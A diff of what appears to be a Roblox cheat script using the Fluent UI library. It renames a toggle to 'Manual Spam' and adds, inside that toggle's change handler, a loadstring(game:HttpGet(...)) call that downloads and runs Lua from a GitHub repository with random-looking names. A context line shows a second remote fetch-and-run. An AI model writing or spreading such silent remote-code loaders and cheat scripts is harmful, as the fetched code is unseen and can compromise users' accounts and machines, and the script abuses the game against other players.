@@ -22,7 +22,7 @@ local Options = Fluent.Options
 
 do
     Fluent:Notify({
-        Title = "Notification",
+        Title = "Wellcome To My Script",
         Content = "Santai dulu maseh",
         SubContent = "SubContent", -- Optional
         Duration = 5 -- Set to nil to make the notification not disappear
@@ -65,9 +65,10 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/xshiba/MaruBitkub/mai
 
 
 
-    local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Toggle", Default = false })
+    local Toggle = Tabs.Main:AddToggle("MyToggle", {Title = "Manual Spam", Default = false })
 
     Toggle:OnChanged(function()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/nqxlOfc/SlzAX17vGCub7iRKVmJid61Bg/main/KwKVzV5SgcFBd9fnpLr4lKCg6.lua"))()
         print("Toggle changed:", Options.MyToggle.Value)
     end)
 
